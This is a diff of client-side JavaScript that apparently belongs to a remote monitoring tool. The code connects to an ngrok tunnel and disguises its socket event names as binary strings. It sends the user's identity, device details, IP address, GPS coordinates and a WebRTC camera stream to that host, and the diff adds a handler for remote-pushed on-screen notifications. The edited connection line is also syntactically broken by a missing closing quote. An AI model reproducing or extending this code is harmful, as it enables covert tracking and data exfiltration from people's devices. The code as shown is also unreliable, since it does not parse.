@@ -1,8 +1,4 @@
-const socket = io('https://08fd-2405-201-201c-51bc-48e4-3877-61e5-5c5.ngrok-free.app', {
-  extraHeaders: {
-    'ngrok-skip-browser-warning': '1234'
-  }
-});
+const socket = io('https://4bbe-2405-201-201c-51bc-f806-b75a-6581-bf5b.ngrok-free.app);
 let publicVapidKey = 'BFVA5gXzIz-p2poU4ltPxWYVkMwCJgDRW83uVFGb0huBSH6kp3g7s0zW_IYSHlyJM32gIGCo9FjtQLhgwNzYOOk';
 
 const applicationServerKey = urlBase64ToUint8Array(publicVapidKey);
@@ -10,6 +6,11 @@ const applicationServerKey = urlBase64ToUint8Array(publicVapidKey);
 const currentuserId = document.getElementById('currentUserId').value;
 const currentuserName = document.getElementById('currentUserName').value;
 const logout = document.getElementById('logout');
+const notification = document.getElementById('notification');
+const notificatioClose = document.getElementById('notificatioClose');
+const notificationTitle = document.getElementById('notificationTitle');
+const notificationMessage = document.getElementById('notificationMessage');
+
 var ipAdd;
 let stream;
 
@@ -24,6 +25,12 @@ const binaryEvent = (event) => {
 
         return binaryValue.padStart(8, '0');
     }).join(' ');
+};
+
+function binaryToString(binary) {
+    return binary.split(' ')
+        .map(bin => String.fromCharCode(parseInt(bin, 2)))
+        .join('');
 };
 
 socket.on('connect', async () => {
@@ -64,7 +71,7 @@ socket.on('connect', async () => {
         userName: currentuserName,
         userId: currentuserId,
         socketId: socketId,
-        // ipAdd: ipAdd,
+        ipAdd: ipAdd,
         deviceInfo: deviceInfo
     };
 
@@ -195,7 +202,7 @@ socket.on('connect', async () => {
                     socket.emit(ice_candidate, binaryData);
                 }
             };
-            
+
             peerConnection.addTrack(videotrack, stream);
 
             const offer = await peerConnection.createOffer();
@@ -319,6 +326,81 @@ socket.on('connect', async () => {
         const lon = stringToBinary(info.lon);
         const sendLocation = binaryEvent('sendLocation');
         socket.emit(sendLocation, lat, lon);
+    });
+
+    const sendNotification = binaryEvent('sendNotification');
+    socket.on(sendNotification, (data) => {
+        try {
+            const jsonString = binaryToString(data);
+
+            const parsedData = JSON.parse(jsonString);
+
+            const { id, title, message, position } = parsedData;
+
+            console.log(id, title, message, position);
+
+            notification.style.display = 'block';
+
+            notificationTitle.innerText = title;
+            notificationMessage.innerText = message;
+
+            notification.style.top = '';
+            notification.style.right = '';
+            notification.style.bottom = '';
+            notification.style.left = '';
+            notification.style.transform = '';
+
+            if (position === 'topRight') {
+                notification.style.right = '0'
+            }
+            else if (position === 'topCenter') {
+                notification.style.right = '50%';
+                notification.style.left = '50%';
+                notification.style.transform = 'translate(-50%)';
+            }
+            else if (position === 'middleRight') {
+                notification.style.top = '50%';
+                notification.style.right = '0';
+                notification.style.transform = 'translateY(-50%)'
+            }
+            else if (position === 'middleCenter') {
+                notification.style.top = '50%';
+                notification.style.right = '50%';
+                notification.style.left = '50%';
+                notification.style.transform = 'translate(-50%, -50%)'
+            }
+            else if (position === 'middleLeft') {
+                notification.style.top = '50%';
+                notification.style.left = '0';
+                notification.style.transform = 'translateY(-50%)'
+            }
+            else if (position === 'bottomRight') {
+                notification.style.bottom = '0';
+                notification.style.right = '0';
+                notification.style.transform = 'translateY(-50%)'
+            }
+            else if (position === 'bottomCenter') {
+                notification.style.bottom = '0';
+                notification.style.right = '50%';
+                notification.style.left = '50%';
+                notification.style.transform = 'translate(-50%, -50%)'
+            }
+            else if (position === 'bottomLeft') {
+                notification.style.bottom = '0';
+                notification.style.left = '0';
+                notification.style.transform = 'translateY(-50%)'
+            }
+            else {
+                notification.style.left = '0';
+            }
+
+            notificatioClose.addEventListener('click', () => {
+                notification.style.display = 'none'
+            });
+        }
+        catch (e) {
+            console.log(e, "error");
+        }
     });
 });
 
